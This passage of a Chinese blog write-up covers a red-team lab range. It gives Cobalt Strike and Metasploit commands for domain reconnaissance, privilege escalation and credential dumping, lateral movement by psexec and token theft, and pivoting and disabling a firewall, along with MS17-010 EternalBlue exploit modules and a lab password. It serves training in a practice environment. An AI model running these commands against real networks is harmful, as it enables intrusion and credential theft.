<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">查看用户名：shell whoami</span><br><span class="line">查看主机名：shell hostname</span><br><span class="line">查看用户：shell <span class="built_in">net</span> user</span><br><span class="line">查看管理员：shell <span class="built_in">net</span> localgroup administrators</span><br><span class="line">查看系统详细信息：shell systeminfo</span><br><span class="line">查看操作系统 &amp; 系统版本：shell systeminfo | <span class="built_in">findstr</span> /B /C:"OS 名称" /C:"OS 版本"</span><br><span class="line">查看操作系统 &amp; 系统版本：shell systeminfo | <span class="built_in">findstr</span> /B /C:"OS Name" /C:"OS Version"</span><br><span class="line">查询已安装的软件及版本信息：shell wmic product get name,version</span><br><span class="line">查询进程及服务：shell tasklist /svc</span><br><span class="line">查询进程及服务：shell wmic process list brief</span><br></pre></td></tr></table></figure>

<p>执行后就会返回结果：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/19.png" alt></p>
<p>系统版本信息和安装的服务等：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/20.png" alt></p>
<p>本机的信息收集在网上能看到很多教程，需要的话就搜索对应的命令即可。重点还是在于域的信息收集。</p>
<h4 id="002-域信息收集"><a href="#002-域信息收集" class="headerlink" title="002 域信息收集"></a>002 域信息收集</h4><h5 id="00-是否存在域环境"><a href="#00-是否存在域环境" class="headerlink" title="00 是否存在域环境"></a>00 是否存在域环境</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看DNS服务器：shell <span class="built_in">ipconfig</span> /all </span><br><span class="line">查看主域信息：shell <span class="built_in">net</span> view /domain</span><br><span class="line">查看时间服务器：shell <span class="built_in">net</span> <span class="built_in">time</span> /domain</span><br><span class="line">查询当前的登录域与用户信息：shell <span class="built_in">net</span> config workstation</span><br></pre></td></tr></table></figure>

<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/21.png" alt></p>
<p>上面可以看到发现DNS服务器名为god.org，继续执行命令收集更多域相关信息：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/22.png" alt></p>
<h5 id="01-寻找域控"><a href="#01-寻找域控" class="headerlink" title="01 寻找域控"></a>01 寻找域控</h5><p>使用下面命令定位到域控的地址：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell nslookup god.org</span><br></pre></td></tr></table></figure>

<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/23.png" alt></p>
<p>确定了内网网段中域控的ip地址是：192.168.72.138</p>
<h5 id="02-查询域控和用户信息"><a href="#02-查询域控和用户信息" class="headerlink" title="02 查询域控和用户信息"></a>02 查询域控和用户信息</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">查看当前域的所有用户：shell <span class="built_in">net</span> user /domain</span><br><span class="line">获取域内用户的详细信息：shell wmic useraccount get /all</span><br><span class="line">查看所有域成员计算机列表：shell <span class="built_in">net</span> group "domain computers" /domain</span><br><span class="line">查看域管理员：shell <span class="built_in">net</span> group "domain admins" /domain</span><br><span class="line">查看域控制器：shell <span class="built_in">net</span> group "domain controllers" /domain</span><br><span class="line">查看企业管理组：shell <span class="built_in">net</span> group "enterprise admins" /domain</span><br><span class="line">查看域控，升级为域控时，本地账户也成为域管：shell <span class="built_in">net</span> localgroup administrators /domain</span><br><span class="line">获取域密码信息：shell <span class="built_in">net</span> accounts /domain</span><br><span class="line">获取域信任信息 (cs里执行提示不是内部或外部命令)：shell nltest /domain_trusts</span><br></pre></td></tr></table></figure>

<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/24.png" alt></p>
<h5 id="03-提权"><a href="#03-提权" class="headerlink" title="03 提权"></a>03 提权</h5><p>在执行net user /domain时提示拒绝访问，权限不足。使用CS自带的提权进行操作：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/25.png" alt></p>
<p>等待一个新的shell上线即可，这里返回高权限shell使用的是svc-exe插件：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/34.png" alt></p>
<p>有个system就可以可以进行高权限操作了：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/26.png" alt></p>
<p>查询剩余的域相关信息：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/27.png" alt></p>
<p>下面就针对域收集到的信息进行横向探测。</p>
<h3 id="01-横向探测"><a href="#01-横向探测" class="headerlink" title="01 横向探测"></a>01 横向探测</h3><h4 id="001-抓取凭证和密码"><a href="#001-抓取凭证和密码" class="headerlink" title="001 抓取凭证和密码"></a>001 抓取凭证和密码</h4><p>使用net view探测域中其他机器，然后选择view中的targets即可看到域其他目标：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/28.png" alt></p>
<p>然后使用hashdump和logonpasswords抓取出凭证以及登录密码：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/29.png" alt></p>
<p>选择view中的credentials即可看到抓取的密码和凭证：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/30.png" alt></p>
<h4 id="002-探测主机"><a href="#002-探测主机" class="headerlink" title="002 探测主机"></a>002 探测主机</h4><h5 id="00-ping命令"><a href="#00-ping命令" class="headerlink" title="00 ping命令"></a>00 ping命令</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="keyword">for</span> /L %I <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>) <span class="keyword">DO</span> @<span class="built_in">ping</span> -w <span class="number">1</span> -n <span class="number">1</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">72</span>.%I | <span class="built_in">findstr</span> "TTL="</span><br></pre></td></tr></table></figure>

<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/31.png" alt></p>
<p>使用ping命令如果存活的主机就会ttl字段，我们以此进行作为判别依据，遍历ip进行主机探测。</p>
<h5 id="01-arp命令"><a href="#01-arp命令" class="headerlink" title="01 arp命令"></a>01 arp命令</h5><p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/35.png" alt></p>
<p>直接了当的命令，查看局域网内的其他机器的mac信息，以此探测主机。</p>
<h5 id="03-lodan扫描"><a href="#03-lodan扫描" class="headerlink" title="03 lodan扫描"></a>03 lodan扫描</h5><p>使用CS的脚本管理器载入ladon的cna文件，就能在上线主机右键中使用ladon的功能：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/44.png" alt></p>
<p>然后将Ladon.exe和Ladon.cna放进CS目录中的third-party就可以在beacon中使用Ladon命令：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/45.png" alt></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">扫描网段内存活主机信息：Ladon <span class="number">192</span>.<span class="number">168</span>.<span class="number">72</span>.<span class="number">0</span>/<span class="number">24</span> OsScan</span><br><span class="line">扫描网段内存在MS17-<span class="number">010</span>：Ladon <span class="number">192</span>.<span class="number">168</span>.<span class="number">72</span>.<span class="number">0</span>/<span class="number">24</span> MS17010</span><br></pre></td></tr></table></figure>

<h3 id="02-横向移动"><a href="#02-横向移动" class="headerlink" title="02 横向移动"></a>02 横向移动</h3><h5 id="00-SMB-Beacon"><a href="#00-SMB-Beacon" class="headerlink" title="00 SMB Beacon"></a>00 SMB Beacon</h5><blockquote>
<p>SMB Beacon 使用命名管道通过父级 Beacon 进行通讯，当两个 Beacons 链接后，子 Beacon 从父 Beacon 获取到任务并发送。因为链接的 Beacons 使用 Windows 命名管道进行通信，此流量封装在 SMB 协议中，所以 SMB Beacon 相对隐蔽，绕防火墙时可能发挥奇效 。</p>
</blockquote>
<p>新增一个smb的监听器，选择payload为Beacon_SMB：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/32.png" alt></p>
<p>在已有的beacon中选择一个点击右键，选择Spawn：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/33.png" alt></p>
<p>选择后等待反弹一个子shell，其图标中会带有链接：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/36.png" alt></p>
<p>这就是派生的 SMB Beacon，我们可以在主Beacon上用link host连接它，或者unlink host断开它：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/37.png" alt></p>
<h5 id="01-psexec使用凭证登录"><a href="#01-psexec使用凭证登录" class="headerlink" title="01 psexec使用凭证登录"></a>01 psexec使用凭证登录</h5><p>前面我们抓取了现有beacon中的凭证，可以通过credentials窗口查看。接着在targets中选择非域控主机，右键选择jump中的psexec：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/38.png" alt></p>
<p>在弹出的窗口中选择使用 god.org 的 Administrator 的凭证信息，然后监听器选择刚才创建的 smb beacon，会话也选择对应的 smb beacon 的会话：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/39.png" alt></p>
<blockquote>
<p>复现登录失败，记得是之前修改过域服务器的登录密码，所以原来mimikatz抓取的密码是旧的无法登录。使用AD重新修改密码为hongrisec@2019重新尝试。</p>
</blockquote>
<p>成功执行psexec获取到非域控的域服务器：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/40.png" alt></p>
<p>验证确实控制的是windows server 2003服务器：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/41.png" alt></p>
<p>相同方法获取到域控的shell：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/42.png" alt></p>
<p>同样进入beacon执行命令验证成功：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/43.png" alt></p>
<h5 id="02-窃取token横向"><a href="#02-窃取token横向" class="headerlink" title="02 窃取token横向"></a>02 窃取token横向</h5><p>选择beacon右键的进程列表：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/46.png" alt></p>
<p>在弹出的进程列表中选择域控的进程并且窃取token：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/47.png" alt></p>
<p>然后使用psexec时选择使用当前token即可，执行后等待传回beacon即可：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/48.png" alt></p>
<blockquote>
<p>前面的psexec能迅速地获得域控主机的beacon是因为我们读取到了域管理员账号密码的 hash，但是一般情况下，我们是获取不到的。得学会使用其他不同的方式进行横向。</p>
</blockquote>
<h5 id="03-使用msf横向"><a href="#03-使用msf横向" class="headerlink" title="03 使用msf横向"></a>03 使用msf横向</h5><blockquote>
<p>MSF路由转发：即MSF的跳板功能，其实是MSF框架中自带的一个路由转发功能。实现过程就是MSF框架在已经获取的meterpreter shell的基础上添加一条去往“内网”的路由，此路由的下一跳转发，即网关是MSF攻击平台与被攻击目标建立的一个session会话。</p>
</blockquote>
<p>打开msf然后执行命令查看并添加路由：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets</span><br><span class="line">run autoroute -s <span class="number">192</span>.<span class="number">168</span>.<span class="number">72</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在此sessions中添加路由，使得返回到MSF的shell能够通过session进行路由转发访问到192.168.72.0网段。 </p>
</blockquote>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/49.png" alt></p>
<p>查看是否添加成功：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/53.png" alt></p>
<p>使用arp扫描网段主机：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner RHOSTS=<span class="number">192</span>.<span class="number">168</span>.<span class="number">72</span>.<span class="number">0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>探测主机这块前面也有使用CS操作的方法，这里使用msf是为了记录更加全面。</p>
</blockquote>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/50.png" alt></p>
<p>我们直接攻击域控，首先关闭跳板机的防火墙：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell // 打开肉鸡的shell</span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br><span class="line"><span class="keyword">exit</span> // 返回meterpreter的shell</span><br></pre></td></tr></table></figure>

<blockquote>
<p>msf进入meterpreter使用“sessions 序号”命令；meterpreter进入msf使用“background”命令；mterpreter进入肉鸡shell使用“shell“命令；肉鸡shell进入meterpreter使用”exit“命令；msf装载payload返回无装载的msf使用”back“命令。</p>
</blockquote>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/51.png" alt></p>
<p>关闭后使用background命令回到msf，使用MS17-010插件进行扫描：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> rhosts <span class="number">192</span>.<span class="number">168</span>.<span class="number">72</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line"><span class="built_in">set</span> threads <span class="number">50</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/52.png" alt></p>
<p>扫描出域控存在MS17-010漏洞！其他标注红框就是为了说明前面引用中不同的shell如何转换。下面使用MS17-010进行攻击获取shell，执行下面命令：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue </span><br><span class="line"><span class="built_in">set</span> rhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">72</span>.<span class="number">138</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/54.png" alt></p>
<p>可以看到执行成功但是没有创建session，重新看看有那些可用模块。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17</span><br></pre></td></tr></table></figure>

<p>搜索可用的模块，经过网上查阅似乎只有使用5和11才能攻击成功：</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/55.png" alt></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">show options // 默认执行的命令是<span class="built_in">net</span> group "Domain Admins" /domain”、</span><br><span class="line"><span class="built_in">set</span> rhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">72</span>.<span class="number">138</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/56.png" alt></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> Rhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">72</span>.<span class="number">138</span></span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">128</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>这种方式也没有获取到shell。</p>
<h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p><a href="https://soapffz.com/sec/558.html#menu_index_16" target="_blank" rel="noopener">https://soapffz.com/sec/558.html#menu_index_16</a></p>
<p><a href="https://www.freebuf.com/column/231111.html" target="_blank" rel="noopener">https://www.freebuf.com/column/231111.html</a></p>
<p><a href="https://www.freebuf.com/articles/web/252594.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/252594.html</a></p>
<p><a href="https://www.anquanke.com/post/id/86505" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86505</a></p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/12/26/HackTheBox%E6%B3%A8%E5%86%8C/" rel="next" title="HackTheBox注册">
                <i class="fa fa-chevron-left"></i> HackTheBox注册
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">白仁</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">52</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">5</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#红队靶场评估-1"><span class="nav-number">1.</span> <span class="nav-text">红队靶场评估-1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-环境搭建"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-渗透Web服务器"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 渗透Web服务器</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#00-端口扫描"><span class="nav-number">1.2.1.</span> <span class="nav-text">00 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#01-目录扫描"><span class="nav-number">1.2.2.</span> <span class="nav-text">01 目录扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#02-phpmyadmin写shell"><span class="nav-number">1.2.3.</span> <span class="nav-text">02 phpmyadmin写shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#03-连接Webshell"><span class="nav-number">1.2.4.</span> <span class="nav-text">03 连接Webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#04-shell传递"><span class="nav-number">1.2.5.</span> <span class="nav-text">04 shell传递</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#001-转为CS的shell"><span class="nav-number">1.2.5.1.</span> <span class="nav-text">001 转为CS的shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#002-转为MSF的shell"><span class="nav-number">1.2.5.2.</span> <span class="nav-text">002 转为MSF的shell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-渗透域服务器"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 渗透域服务器</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#00-信息收集"><span class="nav-number">1.3.1.</span> <span class="nav-text">00 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#001-本机信息收集"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">001 本机信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#002-域信息收集"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">002 域信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#00-是否存在域环境"><span class="nav-number">1.3.1.2.1.</span> <span class="nav-text">00 是否存在域环境</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#01-寻找域控"><span class="nav-number">1.3.1.2.2.</span> <span class="nav-text">01 寻找域控</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#02-查询域控和用户信息"><span class="nav-number">1.3.1.2.3.</span> <span class="nav-text">02 查询域控和用户信息</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#03-提权"><span class="nav-number">1.3.1.2.4.</span> <span class="nav-text">03 提权</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#01-横向探测"><span class="nav-number">1.3.2.</span> <span class="nav-text">01 横向探测</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#001-抓取凭证和密码"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">001 抓取凭证和密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#002-探测主机"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">002 探测主机</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#00-ping命令"><span class="nav-number">1.3.2.2.1.</span> <span class="nav-text">00 ping命令</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#01-arp命令"><span class="nav-number">1.3.2.2.2.</span> <span class="nav-text">01 arp命令</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#03-lodan扫描"><span class="nav-number">1.3.2.2.3.</span> <span class="nav-text">03 lodan扫描</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#02-横向移动"><span class="nav-number">1.3.3.</span> <span class="nav-text">02 横向移动</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#00-SMB-Beacon"><span class="nav-number">1.3.3.0.1.</span> <span class="nav-text">00 SMB Beacon</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#01-psexec使用凭证登录"><span class="nav-number">1.3.3.0.2.</span> <span class="nav-text">01 psexec使用凭证登录</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#02-窃取token横向"><span class="nav-number">1.3.3.0.3.</span> <span class="nav-text">02 窃取token横向</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#03-使用msf横向"><span class="nav-number">1.3.3.0.4.</span> <span class="nav-text">03 使用msf横向</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-参考链接"><span class="nav-number">1.4.</span> <span class="nav-text">0x03 参考链接</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">白仁</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
